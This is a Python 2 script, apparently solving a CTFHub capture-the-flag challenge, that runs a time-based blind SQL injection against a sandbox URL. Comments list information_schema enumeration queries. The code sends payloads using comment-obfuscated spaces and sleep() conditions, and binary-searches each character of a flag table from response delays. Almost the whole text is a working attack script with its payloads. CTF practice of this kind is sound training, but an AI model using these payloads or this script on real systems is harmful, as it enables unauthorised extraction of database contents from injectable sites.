#! python2
# select/**/group_concat(schema_name)/**/from/**/information_schema.schemata
# select group_concat(table_name) from information_schema.tables where table_schema="sqli"
# select group_concat(column_name) from information_schema.columns where table_name="flag"
# select/**/flag/**/from/**/sqli.flag
import requests as re
name=""
chk=0
url='http://challenge-2e5e053716cdc1aa.sandbox.ctfhub.com:10080?id='
for i in xrange(1,100):
	left=33
	right=126
	while right-left!=1:
		mid=(left+right)/2
		payload='1/**/and/**/if(ascii(substr(('+'select/**/flag/**/from/**/sqli.flag'+'/**/limit/**/0,1),'+str(i)+',1))>'+str(mid)+',sleep(2),1)'
		time=re.get(url+payload)
		if time.elapsed.total_seconds() >2:
			left=mid
		else:
			right=mid
	if right==34:
	 	break
	name+=chr(right)
	print(chr(right))
print name